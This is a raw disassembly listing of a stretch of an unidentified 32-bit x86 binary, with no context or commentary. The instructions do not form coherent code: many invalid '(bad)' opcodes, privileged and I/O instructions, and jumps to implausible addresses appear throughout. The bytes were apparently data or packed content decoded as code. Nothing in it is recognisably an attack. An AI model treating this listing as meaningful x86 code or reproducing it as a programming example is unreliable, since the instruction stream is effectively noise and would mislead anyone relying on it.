  40acaf:	xor    edi,DWORD PTR [ebx]
  40acb1:	add    esi,DWORD PTR [edi+0x3]
  40acb4:	mov    ecx,DWORD PTR [edi]
  40acb6:	clc    
  40acb7:	retf   0x55cb
  40acba:	into   
  40acbb:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40acc2:	test   al,0x4d
  40acc4:	push   ebp
  40acc5:	jbe    0x40acfa
  40acc7:	mov    esi,DWORD PTR [ebx]
  40acc9:	mov    al,0x3
  40accb:	push   ebp
  40accc:	add    esi,DWORD PTR [ebx]
  40acce:	rdpmc  
  40acd0:	retf   0x5503
  40acd3:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40acd9:	dec    ebp
  40acda:	stc    
  40acdb:	mov    ecx,DWORD PTR [eax]
  40acdd:	or     BYTE PTR [ebp+0x4d],cl
  40ace0:	jmp    0x134ad70
  40ace5:	dec    ebp
  40ace6:	dec    ebp
  40ace7:	(bad)  
  40ace8:	mov    ebx,esp
  40acea:	clc    
  40aceb:	test   ebx,ecx
  40aced:	clc    
  40acee:	ror    DWORD PTR [ebp-0x2a],cl
  40acf1:	mov    esi,ecx
  40acf3:	lock scas eax,DWORD PTR es:[edi]
  40acf5:	inc    ebp
  40acf6:	mov    esi,DWORD PTR [ebx]
  40acf8:	hlt    
  40acf9:	pushf  
  40acfa:	jge    0x40ac87
  40acfc:	sub    ebx,esp
  40acfe:	cmp    ecx,ebx
  40ad00:	ja     0x40acd0
  40ad02:	mov    ebp,DWORD PTR [eax-0x58]
  40ad05:	dec    ebp
  40ad06:	xor    ecx,DWORD PTR [di+0x3]
  40ad0a:	mov    esp,esp
  40ad0c:	clc    
  40ad0d:	push   ebp
  40ad0e:	retf   
  40ad0f:	mov    dl,bl
  40ad11:	adc    esi,edx
  40ad13:	jb     0x40ace3
  40ad15:	add    BYTE PTR [edi-0xb7474b3],ch
  40ad1b:	lock jge 0x40ace9
  40ad1e:	sub    ecx,DWORD PTR [ebp+0x3b]
  40ad21:	mov    esi,DWORD PTR [edi-0x20]
  40ad24:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  40ad2b:	mov    BYTE PTR [ebx-0x34b20729],cl
  40ad31:	mov    edx,ebx
  40ad33:	lock (bad) 
  40ad35:	ror    esi,cl
  40ad37:	push   ebp
  40ad38:	scas   eax,DWORD PTR es:[edi]
  40ad39:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40ad3f:	sahf   
  40ad40:	sub    esi,DWORD PTR [edx]
  40ad42:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40ad48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad49:	xor    esp,DWORD PTR [ebx]
  40ad4b:	add    ecx,DWORD PTR [ebp-0x1c]
  40ad4e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad51:	mov    bl,cl
  40ad53:	cmp    dl,bl
  40ad55:	jb     0x40ad25
  40ad57:	add    dh,dl
  40ad59:	dec    ebp
  40ad5a:	scas   eax,DWORD PTR es:[edi]
  40ad5b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ad61:	shr    DWORD PTR [ebx],cl
  40ad63:	into   
  40ad64:	cmp    edx,esi
  40ad66:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ad6c:	dec    ebp
  40ad6d:	dec    ebp
  40ad6e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ad74:	retf   
  40ad75:	xor    edx,esi
  40ad77:	add    ecx,esi
  40ad79:	imul   ecx,edx
  40ad7c:	mov    DWORD PTR [ebp+0x8],edx
  40ad7f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ad82:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ad88:	add    esi,DWORD PTR [ebx]
  40ad8a:	rol    BYTE PTR [ebx],0x45
  40ad8d:	sysexit 
  40ad8f:	xlat   BYTE PTR ds:[ebx]
  40ad90:	pushf  
  40ad91:	jge    0x40ad1c
  40ad93:	xor    esp,eax
  40ad95:	sub    eax,DWORD PTR [ebp-0x73]
  40ad98:	(bad)  
  40ad99:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ada0:	dec    ebp
  40ada1:	xchg   BYTE PTR [ebx],dh
  40ada3:	inc    DWORD PTR [ebx]
  40ada5:	(bad)  
  40ada6:	jmp    0x40adf5
  40ada8:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40adae:	dec    ebp
  40adaf:	into   
  40adb0:	mov    ebp,DWORD PTR [edi-0x23737420]
  40adb6:	sahf   
  40adb7:	shl    DWORD PTR [edx],cl
  40adb9:	retf   0x5588
  40adbc:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40adc2:	add    eax,DWORD PTR [eax]
  40adc4:	in     al,0x4d
  40adc6:	push   ebp
  40adc7:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40adcd:	bound  eax,QWORD PTR [eax]
  40adcf:	int    0x4d
  40add1:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40add7:	dec    ebp
  40add8:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40adde:	jge    0x40adae
  40ade0:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ade6:	add    cl,dh
  40ade8:	dec    ebp
  40ade9:	dec    DWORD PTR [ebx-0x2c032301]
  40adef:	inc    ebp
  40adf0:	push   ebp
  40adf1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40adf7:	lea    ebx,[esi-0x7400cdac]
  40adfd:	push   eax
  40adfe:	mov    ah,0x45
  40ae00:	push   ebp
  40ae01:	mov    esi,DWORD PTR [ebx]
  40ae03:	les    esi,FWORD PTR [ebx]
  40ae05:	add    BYTE PTR [ebx],al
  40ae07:	inc    DWORD PTR [ebx]
  40ae09:	mov    ecx,DWORD PTR [edi]
  40ae0b:	cld    
  40ae0c:	retf   0x4d80
  40ae0f:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ae15:	jne    0x40ada2
  40ae17:	(bad)  
  40ae18:	in     al,dx
  40ae19:	ror    bl,1
  40ae1b:	pop    edi
  40ae1c:	into   
  40ae1d:	add    BYTE PTR [edi-0xf2f7475],ch
  40ae23:	not    bl
  40ae25:	adc    al,0xca
  40ae27:	inc    ebp
  40ae28:	push   ebp
  40ae29:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ae2f:	push   0xaf80d6
  40ae34:	mov    eax,DWORD PTR [eax]
  40ae36:	fdiv   st(7),st
  40ae38:	sti    
  40ae39:	sbb    dh,cl
  40ae3b:	pop    esi
  40ae3c:	xchg   esp,eax
  40ae3d:	leave  
  40ae3e:	sahf   
  40ae3f:	add    al,0x32
  40ae41:	push   ebp
  40ae42:	cmp    ebp,esp
  40ae44:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ae48:	dec    DWORD PTR [ecx-0x740f0375]
  40ae4e:	push   ebp
  40ae4f:	cld    
  40ae50:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ae56:	retf   0x558b
  40ae59:	clc    
  40ae5a:	xor    esi,eax
  40ae5c:	add    esi,DWORD PTR [ebp-0x75]
  40ae5f:	(bad)  
  40ae60:	hlt    
  40ae61:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  40ae68:	mov    DWORD PTR [edx],ecx
  40ae6a:	hlt    
  40ae6b:	(bad)  
  40ae6c:	dec    ebp
  40ae6d:	add    dh,BYTE PTR [ebx]
  40ae6f:	leave  
  40ae70:	mov    edx,0xffec8d55
  40ae75:	push   ecx
  40ae76:	rol    DWORD PTR [ebp+0x55],1
  40ae79:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ae7f:	mov    eax,0xf8030b33
  40ae84:	lar    ecx,di
  40ae87:	push   ebp
  40ae88:	retf   0x863b
  40ae8b:	jne    0x40ae8a
  40ae8d:	mov    edi,edi
  40ae8f:	or     BYTE PTR [ebp+0x41],dh
  40ae92:	mov    esp,eax
  40ae94:	cld    
  40ae95:	inc    eax
  40ae96:	mov    al,0x29
  40ae98:	add    DWORD PTR [ecx+0x0],eax
  40ae9b:	loope  0x40ae22
  40ae9d:	inc    ecx
  40ae9e:	call   eax
  40aea0:	inc    edx
  40aea2:	mov    eax,DWORD PTR [eax]
  40aea4:	cld    
  40aea5:	mov    eax,DWORD PTR [eax+0x8d0151]
  40aeab:	clc    
  40aeac:	xor    BYTE PTR [ebp+0x45],al
  40aeaf:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40aeb5:	loopne 0x40aeb6
  40aeb7:	mov    edi,edi
  40aeb9:	mov    ecx,eax
  40aebb:	clc    
  40aebc:	jne    0x40ae8e
  40aebe:	call   0x81c1c7
  40aec3:	sub    DWORD PTR [ebp+0x45],esi
  40aec6:	test   esi,eax
  40aec8:	je     0x40aecb
  40aeca:	mov    eax,esi
  40aecc:	cld    
  40aecd:	or     DWORD PTR [eax+0x401c9],eax
  40aed3:	push   ebp
  40aed4:	add    ah,ch
  40aed6:	add    BYTE PTR [ecx+0x6a],dl
  40aed9:	inc    ebp
  40aeda:	push   esi
  40aedb:	mov    DWORD PTR [eax-0x4],edx
  40aede:	pop    edi
  40aedf:	mov    ebx,DWORD PTR [ebx-0x4]
  40aee2:	ret    0xbe
  40aee5:	push   es
  40aee6:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40aeec:	clc    
  40aeed:	lock inc ebp
  40aeef:	jne    0x40af47
  40aef1:	(bad)  
  40aef2:	jne    0x40aef8
  40aef4:	mov    eax,0xf841ba66
  40aef9:	rol    BYTE PTR [esi],1
  40aefb:	(bad)  
  40aefc:	jne    0x40af2f
  40aefe:	cmp    eax,ebx
  40af00:	pop    esi
  40af01:	mov    ecx,DWORD PTR [eax]
  40af03:	push   ecx
  40af04:	inc    ecx
  40af05:	lea    edi,[eax+edi*8+0x42]
  40af09:	inc    ebp
  40af0a:	ror    DWORD PTR [ebx-0x408303be],0x41
  40af11:	xchg   edx,ebp
  40af13:	mov    ebx,eax
  40af15:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40af1b:	or     edi,eax
  40af1d:	inc    ebp
  40af1e:	inc    ebp
  40af1f:	(bad)  
  40af20:	mov    ecx,DWORD PTR [eax]
  40af22:	cld    
  40af23:	(bad)  
  40af24:	jmp    0x40af27
  40af26:	mov    eax,esi
  40af28:	mov    DWORD PTR ds:0x4f8c98b,eax
  40af2e:	rcl    BYTE PTR [esi+0xf],1
  40af31:	iret   
  40af32:	inc    ebp
  40af33:	leave  
  40af34:	(bad)  
  40af35:	dec    DWORD PTR [ecx]
  40af37:	mov    eax,esi
  40af39:	mov    eax,DWORD PTR [edi]
  40af3b:	mov    dh,0xd1
  40af3e:	push   es
  40af3f:	nop
  40af40:	(bad)  
  40af41:	inc    DWORD PTR [ebx]
  40af43:	push   esi
  40af44:	leave  
  40af45:	iret   
  40af46:	add    al,0x46
  40af48:	push   ebp
  40af49:	in     eax,0xec
  40af4b:	push   ebp
  40af4c:	push   ecx
  40af4d:	inc    DWORD PTR [ebp+0x56]
  40af50:	mov    DWORD PTR [esi-0x4],eax
  40af53:	loope  0x40afaa
  40af55:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40af5b:	add    al,BYTE PTR [edx]
  40af5d:	mov    edx,DWORD PTR [ebp-0x17]
  40af60:	cmp    edi,esi
  40af62:	jne    0x40af63
  40af64:	(bad)  
  40af65:	push   esi
  40af66:	pop    es
  40af67:	push   ebp
  40af68:	mov    ebp,esp
  40af6a:	or     BYTE PTR [ebp+0x41],al
  40af6d:	add    edi,edx
  40af6f:	sub    BYTE PTR [eax-0x4],al
  40af72:	shl    BYTE PTR [ebp-0x3e],0x1
  40af76:	add    BYTE PTR [ebx+ecx*4],bl
  40af79:	mov    edx,DWORD PTR [ecx+0x14]
  40af7c:	lea    edx,[edx-0x1ba7508]
  40af82:	push   esi
  40af83:	enter  0xd375,0xb8
  40af87:	test   DWORD PTR [esi],0x6ce0750
  40af8d:	enter  0xd375,0x3b
  40af91:	neg    DWORD PTR [esi+0x50]
  40af94:	or     cl,dl
  40af96:	inc    edx
  40af97:	(bad)  
  40af98:	in     eax,dx
  40af99:	in     al,dx
  40af9a:	(bad)  
  40af9b:	sub    eax,DWORD PTR [ebx]
  40af9d:	inc    eax
  40af9e:	in     eax,dx
  40af9f:	push   eax
  40afa0:	add    dl,BYTE PTR [eax-0x37]
  40afa3:	push   edi
  40afa4:	push   ebp
  40afa5:	imul   ah
  40afa7:	adc    DWORD PTR [ecx-0x1],0x45
  40afab:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40afb1:	lea    edi,[eax-0x7fff4ca]
  40afb7:	mov    eax,0x4550402
  40afbc:	cmp    ebp,ecx
  40afbe:	jne    0x40af6b
  40afc0:	mov    eax,DWORD PTR ds:0x241e808
  40afc6:	loope  0x40afc8
  40afc8:	inc    eax
  40afc9:	stc    
  40afca:	xlat   BYTE PTR ds:[ebx]
  40afcb:	ss inc ecx
  40afcd:	aas    
  40afce:	in     eax,0x7d
  40afd0:	ret    0x8b
  40afd3:	lock mov edi,DWORD PTR [ebp-0x18]
  40afd7:	and    edi,edi
  40afd9:	mov    edi,edi
  40afdb:	call   0xe40eb0b7
  40afe0:	push   es
  40afe1:	add    al,ch
  40afe3:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40afea:	(bad)  
  40afeb:	hlt    
  40afec:	add    eax,0xffd3e87d
  40aff1:	cmp    bh,0x8
  40aff4:	(bad)  
  40aff5:	fld    DWORD PTR [esi]
  40aff7:	out    dx,al
  40aff8:	call   0xff9faf00
  40affd:	cmp    al,0x46
  40afff:	shr    edx,0x8
  40b002:	(bad)  
  40b003:	pop    es
  40b004:	fisttp QWORD PTR [ebp+0xe577eff]
  40b00a:	push   ebx
  40b00b:	add    BYTE PTR [ebx+0x24008b56],cl
  40b011:	add    BYTE PTR [ebp+0x50],al
  40b014:	push   eax
  40b015:	add    DWORD PTR [ebx+0x757d1834],ecx
  40b01b:	sub    edx,DWORD PTR [esi-0x24]
  40b01e:	jne    0x40afd6
  40b020:	lods   eax,DWORD PTR ds:[esi]
  40b021:	mov    edx,DWORD PTR [edx-0x34]
  40b024:	dec    esi
  40b025:	out    0x83,eax
  40b027:	into   
  40b028:	push   edi
  40b02a:	loopne 0x40affa
  40b02c:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40b030:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40b037:	rol    DWORD PTR [edx],0x8
  40b03a:	mov    esp,ecx
  40b03c:	cmp    DWORD PTR [ebx],0xc
  40b03f:	mov    esi,0x5001c0
  40b044:	push   eax
  40b045:	push   cs
  40b046:	push   eax
  40b047:	(bad)  
  40b048:	sub    edx,edi
  40b04a:	push   esi
  40b04b:	adc    al,0xcb
  40b04d:	ins    DWORD PTR es:[edi],dx
  40b04e:	mov    eax,0x203e8
  40b053:	add    al,ah
  40b055:	inc    esi
  40b056:	mov    al,ch
  40b058:	pop    es
  40b059:	add    DWORD PTR [eax],0x1
  40b05c:	add    dh,al
  40b05e:	add    ah,ch
  40b060:	rol    DWORD PTR [edx-0xd],1
  40b063:	cli    
  40b064:	push   0x4a
  40b066:	pop    ecx
  40b067:	retf   0xfe6
  40b06a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40b070:	(bad)  
  40b071:	dec    BYTE PTR [ebx+0x45b1fc72]
  40b077:	(bad)  
  40b078:	sub    ebp,DWORD PTR [ebx]
  40b07a:	and    al,0x52
  40b07c:	(bad)  
  40b07d:	dec    edi
  40b07e:	inc    ebp
  40b07f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40b086:	add    BYTE PTR [ebp-0x7b],dh
  40b089:	pop    eax
  40b08a:	add    BYTE PTR [edx+0x0],bl
  40b08d:	pop    edx
  40b08e:	dec    ebp
  40b08f:	jmp    DWORD PTR [ebx]
  40b091:	and    al,0xec
  40b093:	push   edx
  40b094:	out    0x64,eax
  40b096:	jmp    0xd3f2a69b
  40b09b:	jmp    0x40b0f5
  40b09d:	mov    al,0xfe
  40b09f:	dec    BYTE PTR [ebp-0x18fd8018]
  40b0a5:	add    BYTE PTR [esi+ebp*1],bh
  40b0a8:	pop    edx
  40b0a9:	icebp  
  40b0aa:	mov    eax,cs
  40b0ac:	ins    BYTE PTR es:[edi],dx
  40b0ad:	adc    eax,0x75510000
  40b0b2:	mov    esi,0x70158
  40b0b7:	or     DWORD PTR [eax-0x74f48dfe],esi
  40b0bd:	mov    edi,esp
  40b0bf:	cld    
  40b0c0:	jge    0x40b137
  40b0c2:	(bad)  
  40b0c4:	aas    
  40b0c5:	and    al,0x6d
  40b0c7:	adc    cl,0x1
  40b0ca:	mov    eax,DWORD PTR [eax]
  40b0cc:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40b0d2:	dec    ebp
  40b0d3:	add    eax,ebp
  40b0d5:	add    BYTE PTR [edx],al
  40b0d7:	fadd   DWORD PTR [eax]
  40b0d9:	stc    
  40b0da:	enter  0xee00,0x8b
  40b0de:	sbb    eax,0x1
  40b0e1:	sbb    esi,ecx
  40b0e3:	in     al,0x0
  40b0e5:	in     eax,dx
  40b0e6:	add    BYTE PTR [eax],al
  40b0e8:	jne    0x40b075
  40b0ea:	cmp    edx,esp
  40b0ec:	jb     0x40b0f7
  40b0ee:	jmp    0x40b165
  40b0f0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40b0f6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40b0fc:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40b102:	jb     0x40b08d
  40b104:	pop    edx
  40b105:	fadd   QWORD PTR [ebx-0x7445faa1]
  40b10b:	or     dh,BYTE PTR [edx+0x0]
  40b10e:	inc    edx
  40b10f:	or     dl,bh
  40b111:	xlat   BYTE PTR ds:[ebx]
  40b112:	dec    edx
  40b113:	push   edi
  40b114:	add    al,0x7
  40b116:	leave  
  40b117:	rol    DWORD PTR [edx+eax*1],0x7
  40b11b:	add    ecx,ecx
  40b11d:	mov    edx,ecx
  40b11f:	int3   
  40b120:	jmp    0x40b0e0
  40b122:	mov    al,0x0
  40b124:	(bad)  
  40b125:	jne    0x40b10f
  40b127:	mov    eax,DWORD PTR [edx]
  40b129:	call   0xc1552e2e
  40b12e:	pop    edi
  40b12f:	add    ebx,DWORD PTR [ecx-0x37]
  40b132:	pop    ecx
  40b133:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40b13a:	push   es
  40b13b:	mov    eax,DWORD PTR [eax]
  40b13d:	int3   
  40b13e:	add    ch,al
  40b140:	jae    0x40b12a
  40b142:	int    0x1
  40b144:	enter  0x3000,0x18
  40b148:	add    BYTE PTR [ebp+0x75],al
  40b14b:	mov    esi,DWORD PTR [eax-0x171f0134]
  40b151:	push   0x2
  40b153:	pop    ecx
  40b154:	add    BYTE PTR [eax],cl
  40b156:	push   ebx
  40b157:	lea    edi,[edi+eax*2]
  40b15a:	mov    al,0x1
  40b15c:	jb     0x40b15e
  40b15e:	mov    al,0x10
  40b160:	push   eax
  40b161:	add    al,0x75
  40b163:	add    BYTE PTR [ebx],ch
  40b165:	add    ebx,esp
  40b167:	int3   
  40b168:	jne    0x40b17a
  40b16a:	movsx  edx,cl
  40b16d:	add    DWORD PTR [eax],eax
  40b16f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40b176:	mov    gs,edi
  40b178:	add    BYTE PTR [eax-0x50],ch
  40b17b:	add    al,ch
  40b17d:	mov    eax,DWORD PTR [ecx]
  40b17f:	sub    eax,DWORD PTR [eax]
  40b181:	jb     0x40b1f8
  40b183:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40b187:	jge    0x40b171
  40b189:	add    al,0x1
  40b18b:	add    DWORD PTR [eax],0x0
  40b18e:	jne    0x40b190
  40b190:	je     0x40b1d7
  40b192:	mov    eax,DWORD PTR [edi]
  40b194:	ror    BYTE PTR [ebp+0x4d],1
  40b197:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40b19e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40b1a4:	mov    DWORD PTR [ebx],ebp
  40b1a6:	fadd   DWORD PTR [eax+0x75]
  40b1a9:	inc    eax
  40b1aa:	pop    eax
  40b1ab:	lea    ebx,[ecx+0x4f]
  40b1ae:	push   0xb1000003
  40b1b3:	out    dx,eax
  40b1b4:	add    ebp,DWORD PTR [edx+edx*2]
  40b1b7:	add    BYTE PTR [ebx+ecx*4],bh
  40b1ba:	mov    ch,BYTE PTR [ebx]
  40b1bc:	jb     0x40b230
  40b1be:	add    al,0x89
  40b1c0:	push   eax
  40b1c1:	call   0x8428ff33
  40b1c6:	add    DWORD PTR [eax+eax*1],eax
  40b1c9:	jae    0x40b1df
  40b1cb:	icebp  
  40b1cc:	inc    ebp
  40b1cd:	mov    eax,DWORD PTR gs:[ecx]
  40b1d0:	int3   
  40b1d1:	out    dx,al
  40b1d2:	loopne 0x40b221
  40b1d4:	sub    eax,DWORD PTR [edx]
  40b1d6:	push   0xffffff83
  40b1d8:	pop    esi
  40b1d9:	push   cs
  40b1da:	jl     0x40b1f5
  40b1dc:	add    al,0xaf
  40b1de:	xor    eax,0x832b6d00
  40b1e3:	mov    eax,DWORD PTR [edx]
  40b1e5:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40b1eb:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40b1f1:	inc    ebp
  40b1f2:	shr    ebx,0x3
  40b1f5:	or     DWORD PTR [eax],0x4
  40b1f8:	push   0xffffffa5
  40b1fa:	pop    esi
  40b1fb:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40b202:	jmp    0x40b261
  40b204:	mov    edi,0xff0272
  40b209:	fdivr  QWORD PTR [ebp+0x5d]
  40b20c:	push   0x4e
  40b20e:	pop    ecx
  40b20f:	call   0x40f614
  40b214:	mov    DWORD PTR [ebx],eax
  40b216:	in     al,0xc8
  40b218:	rol    BYTE PTR [ebp-0x75],0xc1
  40b21c:	call   0xaab3fd
  40b221:	pop    esi
  40b222:	enter  0xceff,0x8b
  40b226:	repz mov ecx,DWORD PTR [ebp-0x34]
  40b22a:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40b231:	je     0x40b233
  40b233:	or     DWORD PTR [ebx-0x74183b24],eax
  40b239:	jne    0x40b21f
  40b23b:	jmp    0x40b236
  40b23d:	push   DWORD PTR [edx-0x24]
  40b240:	push   0x4d
  40b242:	pop    ecx
  40b243:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40b247:	jge    0x40b24f
  40b249:	mov    eax,eax
  40b24b:	sub    ebp,DWORD PTR [edx+0x24]
  40b24e:	pop    esi
  40b24f:	inc    ebp
  40b250:	mov    esp,0x8b6077
  40b255:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40b25b:	lods   al,BYTE PTR ds:[esi]
  40b25c:	add    BYTE PTR [ebx],bh
  40b25e:	enter  0xce73,0x49
  40b262:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40b26a:	stc    
  40b26b:	jge    0x40b2df
  40b26d:	jnp    0xdd4035ce
  40b273:	call   0xc3b349
  40b278:	fadd   st(0),st
  40b27a:	dec    esi
  40b27b:	ins    BYTE PTR es:[edi],dx
  40b27c:	stc    
  40b27d:	cmp    al,0x73
  40b27f:	push   ebp
  40b280:	mov    eax,0xf8028b
  40b285:	jne    0x40b248
  40b287:	mov    esi,ecx
  40b289:	mov    esp,DWORD PTR [ebp+0x2c]
  40b28c:	add    edi,DWORD PTR [ebp-0x24]
  40b28f:	sub    esp,eax
  40b291:	and    al,0x45
  40b293:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40b299:	sbb    al,0xee
  40b29b:	pop    esi
  40b29c:	call   0x80b2cc
  40b2a1:	fsubr  st,st(3)
  40b2a3:	sti    
  40b2a4:	add    BYTE PTR gs:[ecx],bh
  40b2a7:	add    eax,esp
  40b2a9:	add    DWORD PTR [esi],eax
  40b2ab:	rol    DWORD PTR [ebp+0x8],0x29
  40b2af:	mov    esp,eax
  40b2b1:	clc    
  40b2b2:	jne    0x40b329
  40b2b4:	mov    eax,0x8b0673
  40b2b9:	loopne 0x40b300
  40b2bb:	loopne 0x40b246
  40b2bd:	lods   al,BYTE PTR ds:[esi]
  40b2be:	int3   
  40b2bf:	inc    ebp
  40b2c0:	mov    DWORD PTR gs:[eax+edi*8],eax
  40b2c4:	add    al,0xc3
  40b2c6:	sub    ecx,DWORD PTR [ebp+0x47]
  40b2c9:	(bad)  
  40b2cb:	shr    BYTE PTR [ebp-0x1f],0xe8
  40b2cf:	add    eax,DWORD PTR [eax]
  40b2d1:	call   0x64273d6
  40b2d6:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40b2dc:	dec    esi
  40b2dd:	ins    DWORD PTR es:[edi],dx
  40b2de:	in     al,dx
  40b2df:	lea    eax,[eax]
  40b2e1:	inc    ebp
  40b2e2:	inc    ebp
  40b2e3:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40b2e9:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40b2f3:	and    al,0xdc
  40b2f5:	ror    DWORD PTR [edx+0x24],0xf7
  40b2f9:	or     BYTE PTR [ebp+0x4c],dh
  40b2fc:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40b300:	stos   BYTE PTR es:[edi],al
  40b301:	adc    edx,edi
  40b303:	inc    esp
  40b304:	add    edi,DWORD PTR [eax]
  40b306:	jne    0x40b2eb
  40b308:	mov    DWORD PTR [eax-0x7449db04],ecx
  40b30e:	cmp    ecx,DWORD PTR [edi]
  40b310:	sub    BYTE PTR [ebp-0x7e],dl
  40b313:	sar    ebp,0xb
  40b316:	jmp    FWORD PTR [edi+0x2400392a]
  40b31c:	sub    esi,DWORD PTR [ebx-0x73]
  40b31f:	mov    esp,DWORD PTR [ecx+edi*4]
  40b322:	mov    ecx,DWORD PTR [eax]
  40b324:	and    BYTE PTR [eax],al
  40b326:	jne    0x40b2f2
  40b328:	sub    ebp,ecx
  40b32a:	sbb    BYTE PTR [esi+0x32],ah
  40b32d:	dec    ebp
  40b32e:	push   ebp
  40b32f:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40b335:	ret    
  40b336:	mov    edx,ebp
  40b338:	leave  
  40b339:	sub    DWORD PTR [esi+0x24],ebx
  40b33c:	ret    0x2b
  40b33f:	pop    ax
  40b341:	push   ebp
  40b342:	rol    BYTE PTR [ebx],0xeb
  40b345:	add    DWORD PTR [ecx+0x6c0001],0x40
  40b34c:	jb     0x40b3a3
  40b34e:	ret    
  40b34f:	in     al,dx
  40b350:	jecxz  0x40b2dd
  40b352:	push   esi
  40b353:	xchg   esp,eax
  40b354:	jne    0x40b356
  40b356:	cmp    edx,DWORD PTR [esi+0x1c]
  40b359:	jne    0x40b33f
  40b35b:	mov    eax,DWORD PTR [ebp-0x77]
  40b35e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40b365:	mov    esi,DWORD PTR [ebp-0x75]
  40b368:	pop    esi
  40b369:	nop
  40b36a:	mov    eax,DWORD PTR [eax]
  40b36c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40b372:	add    al,0x0
  40b374:	inc    ebp
  40b375:	mov    eax,DWORD PTR [ebx]
  40b377:	mov    ebp,ebx
  40b379:	cmp    al,0xf
  40b37b:	or     al,al
  40b37d:	inc    ebp
  40b37e:	inc    ebp
  40b37f:	xor    eax,0x8bc89c8b
  40b384:	ins    BYTE PTR es:[edi],dx
  40b385:	cld    
  40b386:	add    BYTE PTR [edi+0x576c16c0],dh
  40b38c:	add    BYTE PTR [ecx-0x5],dl
  40b38f:	add    eax,0x17200
  40b394:	sbb    al,0x85
  40b396:	dec    esp
  40b397:	je     0x40b3d1
  40b399:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40b39d:	add    BYTE PTR [ebx],bh
  40b39f:	(bad)  
  40b3a0:	and    al,0x34
  40b3a2:	jae    0x40b340
  40b3a4:	mov    cl,cl
  40b3a6:	inc    DWORD PTR [esp]
  40b3a9:	push   ebp
  40b3aa:	shr    esp,0x8
  40b3ad:	in     al,dx
  40b3ae:	push   esp
  40b3af:	and    DWORD PTR [eax],0xffffffdc
  40b3b2:	retf   
  40b3b3:	(bad)  
  40b3b4:	mov    bh,0xe4
  40b3b6:	add    BYTE PTR [ebp+0x450ff8e9],dh
  40b3bc:	retf   0x4cf5
  40b3bf:	pushf  
  40b3c0:	and    bh,al
  40b3c2:	pop    ss
  40b3c3:	rcr    cl,1
  40b3c5:	test   DWORD PTR [eax],eax
  40b3c7:	clc    
  40b3c8:	add    BYTE PTR [ebp+0x2b],al
  40b3cb:	xor    eax,ecx
  40b3cd:	pushf  
  40b3ce:	add    eax,0xd001c7
  40b3d3:	add    eax,0x456cf8c0
  40b3d8:	inc    eax
  40b3d9:	push   ebx
  40b3da:	rcr    DWORD PTR [eax+0x4c0105],0x20
  40b3e1:	inc    ebp
  40b3e2:	fst    DWORD PTR [esi+0x29]
  40b3e5:	mov    eax,DWORD PTR [eax]
  40b3e7:	nop
  40b3e8:	rol    BYTE PTR [eax],0xc0
  40b3eb:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  40b3f1:	add    DWORD PTR [ebx-0x75f9af00],ecx
  40b3f7:	pop    ebp
  40b3f8:	add    DWORD PTR [ecx+0x758bf800],ecx
  40b3fe:	or     BYTE PTR [ebp-0xce8aca],al
  40b404:	mov    bl,BYTE PTR [eax]
  40b406:	add    DWORD PTR [ebp+0x0],edx
  40b409:	call   0xfff3b317
  40b40e:	add    DWORD PTR [edi],ecx
  40b410:	add    BYTE PTR [edi],al
